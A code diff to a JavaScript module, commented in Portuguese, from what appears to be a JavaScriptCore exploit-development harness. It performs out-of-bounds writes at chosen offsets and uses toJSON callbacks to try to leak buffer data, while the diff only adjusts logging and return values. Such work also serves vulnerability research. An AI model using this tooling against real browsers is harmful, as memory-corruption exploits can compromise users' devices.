@@ -7,7 +7,8 @@ import {
 } from '../core_exploit.mjs';
 import { OOB_CONFIG, JSC_OFFSETS } from '../config.mjs';
 
-// Contador global para ser usado pelas variantes de toJSON definidas em runAllAdvancedTestsS3.mjs
+// Contador global, embora a toJSON_AttemptLeakByteLength não deva usá-lo para evitar TypeError.
+// Mantido para a estrutura da executeFocusedTestForTypeError.
 export let current_toJSON_call_count_for_TypeError_test = 0;
 
 export async function executeFocusedTestForTypeError(
@@ -17,7 +18,7 @@ export async function executeFocusedTestForTypeError(
     corruptionOffsetToTest // O offset específico para esta escrita OOB
 ) {
     const FNAME = `executeFocusedTestForTypeError<${testDescription}>`;
-    logS3(`--- Iniciando Teste Focado para TypeError: ${testDescription} ---`, "test", FNAME);
+    logS3(`--- Iniciando Teste Focado: ${testDescription} ---`, "test", FNAME);
     logS3(`    Corrupção OOB: Valor=${toHex(valueToWriteOOB)} @ Offset=${toHex(corruptionOffsetToTest)}`, "info", FNAME);
     document.title = `Iniciando: ${testDescription}`;
 
@@ -31,7 +32,7 @@ export async function executeFocusedTestForTypeError(
     if (!oob_array_buffer_real) {
         logS3("Falha OOB Setup.", "error", FNAME);
         document.title = "ERRO OOB Setup - " + FNAME;
-        return { errorOccurred: new Error("OOB Setup Failed"), calls: current_toJSON_call_count_for_TypeError_test, potentiallyCrashed: false };
+        return { errorOccurred: new Error("OOB Setup Failed"), calls: current_toJSON_call_count_for_TypeError_test, potentiallyCrashed: false, stringifyResult: null };
     }
     document.title = "OOB OK - " + FNAME;
 
@@ -77,7 +78,7 @@ export async function executeFocusedTestForTypeError(
             stepReached = `apos_stringify`;
             potentiallyCrashed = false; 
             document.title = `Strfy OK (${testDescription})`;
-            logS3(`Resultado JSON.stringify: ${String(stringifyResult).substring(0, 100)}... (Chamadas toJSON: ${current_toJSON_call_count_for_TypeError_test})`, "info", FNAME);
+            logS3(`Resultado JSON.stringify: ${String(stringifyResult)} (Chamadas toJSON: ${current_toJSON_call_count_for_TypeError_test})`, "info", FNAME); // Log completo do stringifyResult
         } catch (e) {
             stepReached = `erro_stringify`;
             potentiallyCrashed = false; 
@@ -106,11 +107,11 @@ export async function executeFocusedTestForTypeError(
              logS3(`O TESTE PODE TER CONGELADO/CRASHADO em ${stepReached}. Chamadas toJSON: ${current_toJSON_call_count_for_TypeError_test}`, "error", FNAME);
         }
     }
-    logS3(`--- Teste Focado para TypeError Concluído: ${testDescription} (Chamadas toJSON: ${current_toJSON_call_count_for_TypeError_test}) ---`, "test", FNAME);
+    logS3(`--- Teste Focado Concluído: ${testDescription} (Chamadas toJSON: ${current_toJSON_call_count_for_TypeError_test}) ---`, "test", FNAME);
     if (!potentiallyCrashed && !errorCaptured) {
         document.title = `Teste Concluído OK - ${testDescription}`;
     } else if (errorCaptured && !document.title.startsWith("ERRO Strfy")) { 
         document.title = `ERRO OCORREU (${errorCaptured.name}) - ${testDescription}`;
     }
-    return { errorOccurred: errorCaptured, calls: current_toJSON_call_count_for_TypeError_test, potentiallyCrashed };
+    return { errorOccurred: errorCaptured, calls: current_toJSON_call_count_for_TypeError_test, potentiallyCrashed, stringifyResult };
 }
